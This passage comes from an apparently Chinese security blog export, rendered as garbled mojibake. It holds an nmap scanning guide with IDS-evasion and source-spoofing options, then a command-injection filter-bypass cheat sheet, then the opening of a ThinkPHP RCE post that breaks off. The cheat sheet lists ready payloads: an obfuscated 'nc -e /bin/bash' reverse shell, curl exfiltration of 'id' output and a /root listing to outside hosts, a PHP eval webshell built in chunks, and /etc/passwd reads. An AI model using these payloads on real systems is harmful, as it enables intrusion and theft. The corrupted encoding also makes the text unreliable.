ç‰ˆæœ¬æ£€æµ‹(sV)ç‰ˆæœ¬æ£€æµ‹æ˜¯ç”¨æ¥æ‰«æç›®æ ‡ä¸»æœºå’Œç«¯å£ä¸Šè¿è¡Œçš„è½¯ä»¶çš„ç‰ˆæœ¬.å®ƒä¸åŒäºå…¶å®ƒçš„æ‰«ææŠ€æœ¯ï¼Œå®ƒä¸æ˜¯ç”¨æ¥æ‰«æç›®æ ‡ä¸»æœºä¸Šå¼€æ”¾çš„ç«¯å£ï¼Œä¸è¿‡å®ƒéœ€è¦ä»å¼€æ”¾çš„ç«¯å£è·å–ä¿¡æ¯æ¥åˆ¤æ–­è½¯ä»¶çš„ç‰ˆæœ¬.ä½¿ç”¨ç‰ˆæœ¬æ£€æµ‹æ‰«æä¹‹å‰éœ€è¦å…ˆç”¨TCPSYNæ‰«æå¼€æ”¾äº†å“ªäº›ç«¯å£. 8 Nmapçš„OSæ£€æµ‹ï¼ˆOï¼‰(â€œ-osscan-guessâ€)Nmapæœ€é‡è¦çš„ç‰¹ç‚¹ä¹‹ä¸€æ˜¯èƒ½å¤Ÿè¿œç¨‹æ£€æµ‹æ“ä½œç³»ç»Ÿå’Œè½¯ä»¶ï¼ŒNmapçš„OSæ£€æµ‹æŠ€æœ¯åœ¨æ¸—é€æµ‹è¯•ä¸­ç”¨æ¥äº†è§£è¿œç¨‹ä¸»æœºçš„æ“ä½œç³»ç»Ÿå’Œè½¯ä»¶æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œé€šè¿‡è·å–çš„ä¿¡æ¯ä½ å¯ä»¥çŸ¥é“å·²çŸ¥çš„æ¼æ´ã€‚Nmapæœ‰ä¸€ä¸ªåä¸ºçš„nmap-OS-DBæ•°æ®åº“ï¼Œè¯¥æ•°æ®åº“åŒ…å«è¶…è¿‡2600æ“ä½œç³»ç»Ÿçš„ä¿¡æ¯ã€‚NmapæŠŠTCPå’ŒUDPæ•°æ®åŒ…å‘é€åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œç„¶åæ£€æŸ¥ç»“æœå’Œæ•°æ®åº“å¯¹ç…§ã€‚Nmapçš„æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«æŠ€æœ¯ï¼šè®¾å¤‡ç±»å‹ï¼ˆè·¯ç”±å™¨ï¼Œå·¥ä½œç»„ç­‰ï¼‰è¿è¡Œï¼ˆè¿è¡Œçš„æ“ä½œç³»ç»Ÿï¼‰æ“ä½œç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ï¼ˆæ“ä½œç³»ç»Ÿçš„åç§°å’Œç‰ˆæœ¬ï¼‰ç½‘ç»œè·ç¦»ï¼ˆç›®æ ‡å’Œæ”»å‡»è€…ä¹‹é—´çš„è·ç¦»è·³ï¼‰å¦‚æœè¿œç¨‹ä¸»æœºæœ‰é˜²ç«å¢™ï¼ŒIDSå’ŒIPSç³»ç»Ÿï¼Œä½ å¯ä»¥ä½¿ç”¨-Pnå‘½ä»¤æ¥ç¡®ä¿ä¸pingè¿œç¨‹ä¸»æœºï¼Œå› ä¸ºæœ‰æ—¶å€™é˜²ç«å¢™ä¼šç»„ç»‡æ‰pingè¯·æ±‚.nmap -O -Pn X.X.X.X 9 SCTP INITæ‰«æSCTPï¼ˆStream Control Transmission Protocolï¼Œæµæ§åˆ¶ä¼ è¾“åè®®ï¼‰æ˜¯IETFï¼ˆInternet Engineering Task Forceï¼Œå› ç‰¹ç½‘å·¥ç¨‹ä»»åŠ¡ç»„ï¼‰åœ¨2000å¹´å®šä¹‰çš„ä¸€ä¸ªä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰åè®®ã€‚SCTPå¯ä»¥çœ‹ä½œæ˜¯TCPåè®®çš„æ”¹è¿›ï¼Œå®ƒæ”¹è¿›äº†TCPçš„ä¸€äº›ä¸è¶³ï¼ŒSCTP INIT Pingæ‰«æé€šè¿‡å‘ç›®æ ‡å‘é€INITåŒ…ï¼Œæ ¹æ®ç›®æ ‡ä¸»æœºçš„ç›¸åº”åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦å­˜æ´»ã€‚nmap -PY -v 192.168.1.1 å…¶ä»–å‚æ•°ï¼š-sXï¼š XmasTree scan è®¾ç½®FINï¼ŒPSHï¼ŒURGå’Œæ ‡å¿—ã€‚-sNï¼š Null æ‰«ææ¨¡å¼,ä¸è®¾ç½®ä»»ä½•ä½ï¼ˆTCPæ ‡å¿—æ ‡å¤´æ˜¯0ï¼‰ã€‚ç”¨äºé€ƒè„±ä¸€äº›é˜²ç«å¢™å’ŒåŒ…è¿‡æ»¤è½¯ä»¶èƒ½å¤Ÿå¯¹å‘é€åˆ°è¢«é™åˆ¶ç«¯å£çš„SYNæ•°æ®åŒ…è¿›è¡Œçš„ç›‘è§†-sF: FINæ‰«æ è®¾ç½®åªæ˜¯TCP FINä½ã€‚â€“sA: TCP ACK æ‰«æ æ²¡æœ‰åˆ¤æ–­ç«¯å£çš„å¼€æ”¾æƒ…å†µã€‚å®ƒæ˜¯ç”¨æ¥ç»˜åˆ¶å‡ºé˜²ç«å¢™è§„åˆ™ï¼Œå¯¹å“ªäº›ç«¯å£è¿›è¡Œäº†ä¿æŠ¤ã€‚-S ip: ä¼ªè£…æºipè¿›è¡Œæ‰«æï¼Œéœ€è¦ä½¿ç”¨ä½¿ç”¨â€“eæŒ‡å®šç½‘å¡å¹¶ä¸”ä½¿ç”¨-Pnå‚æ•°-scanflag è‡ªå®šä¹‰æ‰«æç±»å‹ é€šè¿‡æŒ‡å®šä»»æ„TCPæ ‡å¿—æ¥è®¾è®¡è‡ªå·±çš„æ‰«ænmap -e ç›®æ ‡ç½‘å¡ ç›®æ ‡ip -S ä¼ªè£…ip -Pnnmap -iflistï¼šæŸ¥çœ‹æœ¬åœ°è·¯ç”±ä¸æ¥å£-b ä½¿ç”¨FTP bounce scanæ‰«ææ–¹å¼ nmapå¸¸ç”¨æ‰«ææ–¹å¼ï¼špingæ‰«æï¼ˆ-sP)nmap -sP target ping æ‰«æï¼Œæ£€æµ‹å­˜æ´»æ€§ã€‚12345678910111213â–¶ nmap -sP 192.168.1.0/24Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-14 20:44 CSTNmap scan report for 192.168.1.1Host is up (0.024s latency).Nmap scan report for 192.168.1.100Host is up (0.029s latency).Nmap scan report for 192.168.1.103Host is up (0.010s latency).Nmap scan report for 192.168.1.112Host is up (0.0018s latency).Nmap scan report for 192.168.1.119Host is up (0.041s latency).Nmap done: 256 IP addresses (5 hosts up) scanned in 9.53 seconds åŒæ—¶å¯ä»¥ä½¿ç”¨CIDRè¡¨ç¤ºæ•´ä¸ªå­ç½‘ï¼Œå¯ä»¥ä½¿ç”¨-exclude æ’é™¤å•ä¸ªipæ‰«ætxtæ–‡ä»¶å†…çš„ä¸»æœºï¼šnmap -iL txt éœ€è¦txtä¸nmapåœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ traceroute å¯è¢«ç”¨äºè·Ÿè¸ªçš„ç½‘ç»œè·¯å¾„æŒ‡å®šçš„ä¸»æœº-r æŒ‡ç¤ºçš„Nmapå§‹ç»ˆæ‰§è¡Œå¯¹ç›®æ ‡IPåœ°å€çš„åå‘DNSè§£æã€‚-råœ¨å¯¹ä¸€ä¸ªIPæ®µè¿›è¡Œä¾¦æŸ¥æ—¶éå¸¸æœ‰ç”¨ï¼ŒNmapå°†å°è¯•æŸ¥è¯¢æ¯ä¸ªipåœ°å€çš„åå‘DNSä¿¡æ¯-n ç”¨äºç¦ç”¨åå‘DNSè§£æ-system-dns æŒ‡ç¤ºNMAPä½¿ç”¨ä¸»æœºç³»ç»Ÿè‡ªå¸¦çš„DNSè§£æå™¨ï¼Œè€Œä¸æ˜¯å…¶è‡ªèº«å†…éƒ¨çš„æ–¹æ³•-dns-servers ç”¨äºæ‰«ææ—¶æ‰‹åŠ¨æŒ‡å®šDNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ã€‚ä½¿ç”¨znmapå¯æ–¹ä¾¿è®°ä½å‘½ä»¤ã€‚nmap -A 192.168.1.19 (æ‰§è¡Œè·¯ç”±è·Ÿè¸ªç­‰)å¦å¤–ï¼Œnmapå®˜æ–¹æ–‡æ¡£ä¸­çš„ä¾‹å­ï¼šnmap -v ip/domainè¿™ä¸ªé€‰é¡¹æ‰«æä¸»æœºscanmeä¸­æ‰€æœ‰çš„ä¿ç•™TCPç«¯å£ã€‚é€‰é¡¹-vå¯ç”¨ç»†èŠ‚æ¨¡å¼ã€‚nmap -sS -O ip/24ç¡®å®šç›®æ ‡æœºæ”¯æŒå“ªäº›IPåè®® (TCPï¼ŒICMPï¼ŒIGMPç­‰):nmap -sO 192.168.1.19 nmapè„šæœ¬ä½¿ç”¨ï¼š1ã€å¢åŠ è„šæœ¬ï¼šé¦–å…ˆå¯ä»¥å°†å†™å¥½æˆ–è€…æ”¶é›†å¥½çš„è„šæœ¬ç½®äº$ Nmap_DATA/nselib/data/æ–‡ä»¶å¤¹ä¸­ç„¶åæ‰§è¡ŒNmap -script-updatedbå‘½ä»¤æ›´æ–°æ•°æ®åº“å³å¯ä½¿ç”¨è„šæœ¬2ã€æœ¬åœ°è„šæœ¬åˆ†ç±»ä¸è¯´æ˜ï¼šauth: è´Ÿè´£å¤„ç†é‰´æƒè¯ä¹¦ï¼ˆç»•å¼€é‰´æƒï¼‰çš„è„šæœ¬broadcast: åœ¨å±€åŸŸç½‘å†…æ¢æŸ¥æ›´å¤šæœåŠ¡å¼€å¯çŠ¶å†µï¼Œå¦‚dhcp/dns/sqlserverç­‰æœåŠ¡brute: æä¾›æš´åŠ›ç ´è§£æ–¹å¼ï¼Œé’ˆå¯¹å¸¸è§çš„åº”ç”¨å¦‚http/snmpç­‰default: ä½¿ç”¨-sCæˆ–-Aé€‰é¡¹æ‰«ææ—¶å€™é»˜è®¤çš„è„šæœ¬ï¼Œæä¾›åŸºæœ¬è„šæœ¬æ‰«æèƒ½åŠ›discovery: å¯¹ç½‘ç»œè¿›è¡Œæ›´å¤šçš„ä¿¡æ¯ï¼Œå¦‚SMBæšä¸¾ã€SNMPæŸ¥è¯¢ç­‰dos: ç”¨äºè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»exploit: åˆ©ç”¨å·²çŸ¥çš„æ¼æ´å…¥ä¾µç³»ç»Ÿexternal: åˆ©ç”¨ç¬¬ä¸‰æ–¹çš„æ•°æ®åº“æˆ–èµ„æºï¼Œä¾‹å¦‚è¿›è¡Œwhoisè§£æfuzzer: æ¨¡ç³Šæµ‹è¯•çš„è„šæœ¬ï¼Œå‘é€å¼‚å¸¸çš„åŒ…åˆ°ç›®æ ‡æœºï¼Œæ¢æµ‹å‡ºæ½œåœ¨æ¼æ´ intrusive: å…¥ä¾µæ€§çš„è„šæœ¬ï¼Œæ­¤ç±»è„šæœ¬å¯èƒ½å¼•å‘å¯¹æ–¹çš„IDS/IPSçš„è®°å½•æˆ–å±è”½malware: æ¢æµ‹ç›®æ ‡æœºæ˜¯å¦æ„ŸæŸ“äº†ç—…æ¯’ã€å¼€å¯äº†åé—¨ç­‰ä¿¡æ¯safe: æ­¤ç±»ä¸intrusiveç›¸åï¼Œå±äºå®‰å…¨æ€§è„šæœ¬version: è´Ÿè´£å¢å¼ºæœåŠ¡ä¸ç‰ˆæœ¬æ‰«æï¼ˆVersion Detectionï¼‰åŠŸèƒ½çš„è„šæœ¬vuln: è´Ÿè´£æ£€æŸ¥ç›®æ ‡æœºæ˜¯å¦æœ‰å¸¸è§çš„æ¼æ´ï¼ˆVulnerabilityï¼‰ï¼Œå¦‚æ˜¯å¦æœ‰MS08_0673ã€è„šæœ¬ç¼–å†™ï¼š ç»éªŒä¸bypassæŠ€å·§ï¼šä¸€èˆ¬idsä¸ä¼šè®°å½•sSæ‰«ææ–¹å¼ï¼Œä½†æ˜¯é»˜è®¤çš„sTä¸€èˆ¬ä¼šè¢«å¯Ÿè§‰ã€‚ä½¿ç”¨nmap -f host å…¶ä»–ï¼š1ã€NMAPæ—¶é—´è®¾ç½®ï¼šNmap -T [0-5]ç›®æ ‡0:æœ€ç¼“æ…¢çš„&lt;bypass waf or ids&gt; ------&gt; 4/5:åŠ é€Ÿæ‰«æã€æœ€å¿«é€Ÿåº¦æ‰«æ2ã€æ‰«æçš„å¹¶å‘è®¾ç½®ä»¥åŠä¸»æœºåˆ†ç»„è®¾ç½®ï¼š1234Nmap -min-parallelism [æ•°é‡] [ç›®æ ‡] å¹¶å‘ç«¯å£æ‰«æçš„æœ€å°æ•°é‡Nmap -max-parallelism [æ•°é‡] [ç›®æ ‡] æœ€å¤§æ•°é‡Nmap -max-hostgroup [æ•°ç›®] [ç›®æ ‡] å¹¶å‘æ‰«æä¸»æœºæ•°çš„æœ€å¤§å€¼Nmap -min-hostgroup [æ•°ç›®] [ç›®æ ‡] å¹¶å‘æ‰«æä¸»æœºæ•°çš„æœ€å°å€¼ 3ã€RTTè¶…æ—¶è®¾ç½®Nmap -initial-rtt-timeout [æ—¶é—´] [ç›®æ ‡] æ§åˆ¶ç½‘ç»œå“åº”åˆå§‹è¶…æ—¶Nmap -max-rtt-timeout [æ—¶é—´] [ç›®æ ‡] æŒ‡å®šæœ€å¤§RTTæ•°æ®åŒ…å“åº”è¶…æ—¶ï¼Œå¯¹äºæ‰«æå¤§å—åœ°å€å¯é€‚å½“æé«˜ä»¥é˜²æ­¢nmapæ–­å¼€4ã€TTLè®¾ç½®Nmap -ttl [æ—¶é—´] [ç›®æ ‡]: TTLç”¨äºæŒ‡å®šæ‰«æä¸­çš„TTLå€¼5ã€å…¶ä»–ï¼š1234567Nmap -max-retries [æ•°ç›®] [ç›®æ ‡]: æ¯ä¸ªæ¢é’ˆçš„æœ€å¤§é‡ä¼ æ¬¡æ•°Nmap -scan-delay [æ—¶é—´] [ç›®æ ‡]: æŒ‡å®šæ‰«æå»¶è¿ŸæŒ‡ç¤ºçš„Nmapåœ¨å‘é€æ¢é’ˆä¹‹é—´çš„æŒ‡å®šçš„æœ€å°æ—¶é—´é—´éš”æ˜¯å¤šä¹…Nmap -host-timeout [æ—¶é—´] [ç›®æ ‡]ï¼šæŒ‡å®šNmapåœ¨è¶…æ—¶å¤šå°‘æ—¶é—´åæ”¾å¼ƒå¯¹ä¸»æœºçš„æ‰«æNmap -max-scan-delay [æ—¶é—´] [ç›®æ ‡]ï¼šNmapåœ¨å‘é€æ¢é’ˆä¹‹é—´çš„æŒ‡å®šçš„æœ€å¤§æ—¶é—´é—´éš”æ˜¯å¤šä¹…ã€‚Nmap -min-rate [æ•°é‡] [ç›®æ ‡]ï¼šNmapæ¯ç§’é’Ÿå‘é€çš„æ•°æ®åŒ…æ•°é‡æœ€å°æ˜¯å¤šå°‘ã€‚Nmap -max-rate [æ•°é‡] [ç›®æ ‡]ï¼šNmapæ¯ç§’é’Ÿå‘é€çš„æ•°æ®åŒ…æ•°é‡æœ€å¤§æ˜¯å¤šå°‘Nmap -defeat-rst-ratelimit [ç›®æ ‡]ï¼šåœ¨ç›®æ ‡é€šè¿‡å‘é€RSTåŒ…æ¥é™åˆ¶æ‰«æé€Ÿç‡çš„æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œå®ƒå¯ä»¥åŠ å¿«æ‰«æé€Ÿåº¦ï¼Œç„¶è€Œä¼šå½±å“ç»“æœçš„å‡†ç¡®åº¦ã€‚ å°æŠ€å·§ï¼š1ã€macä¸‹å»ºè®®æ‰«æç«¯å£å‰åŠ ä¸Šsudoï¼Œæœ‰å¯èƒ½ç”±äºæƒé™é—®é¢˜æ— æ³•æ·±å…¥æ£€æµ‹ç«¯å£ã€‚2ã€æ‰«æè¿‡ç¨‹ä¸­åŠ ä¸Š-n å¯ç¦æ­¢åå‘dnsè§£æï¼Œå¢åŠ é€Ÿåº¦3ã€ä½¿ç”¨â€“packet-trace è¿›è¡Œæ•°æ®åŒ…è·Ÿè¸ªã€‚æœªå®Œå¾…ç»­ å‚è€ƒå®˜æ–¹ä¹¦ç±ï¼š https://nmap.org/book/intro.htmlNmapå¤‡å¿˜å•ï¼šhttps://www.freebuf.com/sectool/101335.htmlè„šæœ¬å¼€å‘ï¼šhttp://www.freebuf.com/sectool/177300.html]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
        <tag>ç«¯å£æ¢æµ‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›æ€»ç»“ä¸tips]]></title>
    <url>%2F2019%2F01%2F15%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93%E4%B8%8Etips%2F</url>
    <content type="text"><![CDATA[ä¹‹å‰æœ‰åšè¿‡ä¸€äº›ç¬”è®°ï¼ŒåŠ ä¸Šéœ€è¦åšäº†ä¸€äº›é¢˜ï¼Œç»¼åˆç½‘ä¸Šçš„ä¸€äº›å§¿åŠ¿æ€»ç»“ä¸€ä¸‹ï¼š å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼š**php**: system()ã€shell_exec()ã€exec()ã€passthru()ã€popen()ã€proc_open()ã€pcntl_exec()ï¼Œdl()**python**: eval()ã€os.systemï¼ˆï¼‰ã€os.Popenï¼ˆï¼‰ã€subprocess.Popenï¼ˆï¼‰ã€subprocess.call(xxï¼Œshell=True)ã€commands.getstatus/outputï¼ˆï¼‰**java**: å­˜åœ¨Runtimeç±»ï¼Œåœ¨è¯¥ç±»ä¸­æä¾›äº†execæ–¹æ³•ç”¨ä»¥åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­æ‰§è¡Œç‰¹å®šçš„å­—ç¬¦ä¸²å‘½ä»¤**other**: ImageMagickç»„ä»¶ç­‰æ¼æ´ã€bashæ¼æ´ã€struts2ç³»åˆ—ã€tpå‘½ä»¤æ‰§è¡Œç­‰ ç»•è¿‡æŠ€å·§ï¼š1ã€å‘½ä»¤åˆ†éš”ç¬¦ï¼š123456%0aã€%0d æ¢è¡Œç¬¦ä¸å›è½¦ç¬¦ï¼ˆphpç¯å¢ƒï¼‰| ç¬¬ä¸€æ¡å‘½ä»¤ç»“æœä½œä¸ºç¬¬äºŒæ¡å‘½ä»¤çš„è¾“å…¥(eg.:ls|&gt;./a.txt)|| ç¬¬ä¸€æ¡æ‰§è¡Œå¤±è´¥ï¼Œæ‰§è¡Œç¬¬äºŒæ¡å‘½ä»¤ï¼ˆeg.:xx||ls); è¿ç»­æŒ‡ä»¤åŠŸèƒ½ã€‚&amp; è¿æ¥çš„ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ&amp;&amp; å½“ç¬¬ä¸€æ¡æ‰§è¡ŒæˆåŠŸçŒœæ‰§è¡Œåç»­å‘½ä»¤ 2ã€ç»•è¿‡ç©ºæ ¼: 123456&lt; é‡å®šå‘ï¼ˆeg.: cat&lt;flag.php)&lt;&gt; é‡å®šå‘ ï¼ˆeg.: ls&lt;&gt;a.txt)$IFS$9 (Ubuntuä¸‹æµ‹è¯•é€šè¿‡)åé¢åŠ ä¸ª$ä¸&#123;&#125;ç±»ä¼¼ï¼Œèµ·æˆªæ–­ä½œç”¨ï¼Œ$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå¦‚cat$IFS2$9flag.php$&#123;IFS&#125; ï¼ˆUbuntuä¸‹æµ‹è¯•é€šè¿‡)å•çº¯cat$IFS2,IFS2è¢«bashè§£é‡Šå™¨å½“åšå˜é‡åï¼Œè¾“ä¸å‡ºæ¥ç»“æœï¼ŒåŠ ä¸€ä¸ª&#123;&#125;å°±å›ºå®šäº†å˜é‡åï¼Œå¦‚cat$&#123;IFS2&#125;flag.php%09 phpç¯å¢ƒä¸‹å¯æ›¿ä»£ç©ºæ ¼ã€‚php7.1 æµ‹è¯•å¤±è´¥ã€‚$IFS ubuntuæµ‹è¯•é€šè¿‡ 3ã€å‘½ä»¤ç»“æŸç¬¦å·ï¼š12%00 -- éœ€è¦phpç¯å¢ƒ%20# -- éœ€è¦phpç¯å¢ƒ 4ã€é»‘åå•ç»•è¿‡1ï¼‰é€šé…ç¬¦åˆ©ç”¨ï¼š12???/??t /???/p??s?? ==&gt; /bin/cat /etc/passwd/???/n? -e /???/b??h 2130706433 1337 ==&gt; nc -e /bin/bash 127.0.0.1 1337 2ï¼‰å¤¹æ‚å­—ç¬¦ï¼š1ã€å•å¼•å·oråŒå¼•å·ï¼š cat /etc/passwd ==&gt; cat /e&#39;&#39;t&#39;&#39;c/p&#39;&#39;a&#39;ss&#39;&#39;w&#39;&#39;d&#39; OR ca&#39;&#39;t x&quot;&quot;.php2ã€ç©ºå­—ç¬¦ï¼š Cat /etc/passwd ==&gt; cat$u /etc$u/passwd$uæˆ–è€…ca$1t /et$1c/passwd$uï¼š($åä»…èƒ½ä¸ºæ•°å­—)3ã€åæ–œæ \: l\s` 3ï¼‰å­—ç¬¦ä¸²æ‹¼æ¥ï¼š12a=c;b=at;c=flag;$a$b $ca=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125; 4)ä»æ–‡ä»¶ä¸­è·å–æ‹¼æ¥ï¼š1expr substr $(awk NR==1 test.php) 1 1ï¼ˆe.gï¼šå¦‚ä¸‹å›¾ï¼‰ 5ï¼‰ç¼–ç ï¼š12345å¯¹phpè€Œè¨€ï¼Œå¯è¿›è¡Œè¿›åˆ¶/å­—ç¬¦è½¬æ¢ï¼šç¼–ç ä¸º8è¿›åˆ¶or 16è¿›åˆ¶ï¼Œæˆ–è€…å…¶ä»–æ–¹å¼ç¼–ç (Unicode)ç­‰é‡‡ç”¨base64ç¼–ç ä¹Ÿå¯ä»¥ç»•è¿‡wafå…³é”®å­—ï¼ˆä¸€èˆ¬å¯è¢«æ£€æµ‹ï¼‰eg.echo &quot;d2hvYW1p&quot;|base64 -dcurl http://9sk1fm.ceye.io/$(id|base64)for l in `ls /root|base64 -w 100`; do curl http://127.0.0.1:9090/abr/$l; done; 6)åå¼•å·1aaa`whoami`;`ls` 7)ipä¸­.ç»•è¿‡ï¼šå°†åœ°å€æ›¿æ¢ä¸ºæ•°å­—åœ°å€ï¼šå¦‚127.0.0.1å¯ä»¥è½¬åŒ–ä¸º2130706433ï¼ˆ10è¿›åˆ¶or16è¿›åˆ¶0x7F000001ï¼‰ã€‚åœ¨çº¿åœ°å€ï¼šhttp://www.msxindl.com/tools/ip/ip_num.asp 8ï¼‰æ— å›æ˜¾ï¼švpsç›‘å¬ç«¯å£ï¼Œå‘curlè¯·æ±‚(or:ceye.io)è‹¥curlã€wgetç­‰å‘½ä»¤è¢«ç¦ç”¨ï¼Œå¯é€šè¿‡ping vps ip ç„¶åä½¿ç”¨netstat -s -p icmpæŸ¥çœ‹å˜åŒ– 9ï¼‰windowsä¸‹ä½¿ç”¨batæ–¹å¼è¿è¡Œï¼š12345678910&lt;?php$command = &apos;dir &apos;.$_POST[&apos;dir&apos;];$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents(&apos;out.bat&apos;,$escaped_command);system(&apos;out.bat&apos;);?&gt;æ‰§è¡Œ.batæ–‡ä»¶çš„æ—¶å€™ï¼Œåˆ©ç”¨%1aï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤æ‰§è¡Œå‘½ä»¤.dir=../ %1a whoami 2ã€123for /F %x in (&apos;dir /b D:\&apos;) do ping -n 1 xxx.%x.xxx.ceye.ioor. do start 10)get_defined_functions(phpç¯å¢ƒ)ï¼šé€šè¿‡è°ƒç”¨ç³»ç»Ÿå‡½æ•°php -r â€˜print_r(get_defined_functions()[internal]);â€™åé¢æ·»åŠ [id](ç›¸åº”çš„å‘½ä»¤) 11)é•¿åº¦é™åˆ¶çš„çªç ´ï¼š1234echo &apos;&lt;?php&apos; &gt;1echo &apos;@eval(&apos; &gt;&gt;1echo &apos;$_POST[1]&apos; &gt;&gt;1echo &apos;); ?&gt;&apos; &gt;&gt;1 æˆ–è€…å‚è€ƒæ–‡ç« ï¼š http://whc.dropsec.xyz/2017/05/08/%E7%BB%95%E8%BF%877%E4%B8%AA%E5%AD%97%E7%AC%A6getshell/ï¼š 12ï¼‰å·§ç”¨å­—ç¬¦æ•°ç»„ï¼ˆphpçš„webshellç¯‡,æœ¬æ–‡ä¸ä½œè¿‡å¤šæè¿°ï¼Œå‚è€ƒé“¾æ¥ï¼šhttp://www.cnblogs.com/Littlehann/p/3522990.htmlï¼‰ å…¶ä»–ï¼š1ã€ä¸€ä¸ªè¯»æ–‡ä»¶å†…å®¹çš„é›†åˆï¼š 12345678910111213141516171819202122232425file -f xxx --å°†æ˜¾ç¤ºåœ¨ FILE åˆ—è¡¨ä¸­æŒ‡å®šçš„æ¯ä¸ªæ–‡ä»¶çš„ç±»å‹ï¼Œé—´æ¥å¯å¾—åˆ°æ–‡ä»¶å†…å®¹ã€‚zip -T --unzip-command &quot;sh -c id&quot; aa.zip aa.txt cat--ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡ºtac--ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡ºmore-- æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„ç°å®æ–‡ä»¶å†…å®¹less å’Œmoreç±»ä¼¼ï¼Œä½†å…¶ä¼˜ç‚¹å¯ä»¥å¾€å‰ç¿»é¡µï¼Œè€Œä¸”è¿›è¡Œå¯ä»¥æœç´¢å­—ç¬¦head-- åªæ˜¾ç¤ºå¤´å‡ è¡Œtail --åªæ˜¾ç¤ºæœ€åå‡ è¡Œnl --ç±»ä¼¼äºcat -nï¼Œæ˜¾ç¤ºæ—¶è¾“å‡ºè¡Œå·tailf-- ç±»ä¼¼äºtail -fvim --ä½¿ç”¨vimå·¥å…·æ‰“å¼€æ–‡æœ¬vi --ä½¿ç”¨viæ‰“å¼€æ–‡æœ¬cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡ºstrings ---æ‰“å°æ–‡ä»¶ä¸­çš„å¯æ‰“å°å­—ç¬¦ä¸²(strings /etc/passwd)curl file:///etc/passwdsort -- ä»æœ€åä¸€è¡Œå¼€å§‹è¯»å–æ–‡ä»¶find -- åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä»¥åŠå­ç›®å½•æ‰€æœ‰æ–‡ä»¶find . -type f -exec curl sd1.d.net &#123;&#125; \; find æ‰§è¡Œå‘½ä»¤&amp;&#123;grep,-nrw,.&#125; -- é€’å½’è¯»å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä»¥åŠå­ç›®å½•æ‰€æœ‰æ–‡ä»¶grep -r .. -- åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä»¥åŠå†…å®¹&#123;cat,/etc/passwd&#125;curl file:///etc/passwdstrings /etc/passwduniq -c/etc/passwdbash -v /etc/passwdrev /etc/passwd 2ã€å†™æ–‡ä»¶åäº†1tee åªè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡º 2ã€ä¸€ä¸ªå¼€æºoså‘½ä»¤æ³¨å…¥payloadç”Ÿæˆå™¨FUzzing: https://github.com/ewilded/shelling 3ã€å‚è€ƒé“¾æ¥ï¼šhttps://www.jianshu.com/p/5e505e3d8075https://www.anquanke.com/post/id/84920]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»thinkphpè¿œç¨‹ä»£ç æ‰§è¡Œå¼€å§‹]]></title>
    <url>%2F2018%2F12%2F12%2F24%2F</url>
    <content type="text"><![CDATA[9å·æ™šä¸Šthinkphpå®˜ç½‘å‘å¸ƒå®‰å…¨æ›´æ–°:https://blog.thinkphp.cn/869075ä¿®å¤äº†ä¸€å¤„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå½±å“æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„5.0 â€“ V5.0.23ç‰ˆæœ¬ä¸5.1 â€“ V5.1.31ç‰ˆæœ¬thinkphp å¼€å‘ç«™ç‚¹ã€‚ï¼Œç®€å•è®°å½•ä¸€ä¸‹è¿‘ä¸¤å¤©ä¸€äº›ä¿¡æ¯ä¸å¿ƒå¾—ã€‚ thinkphpä»£ç 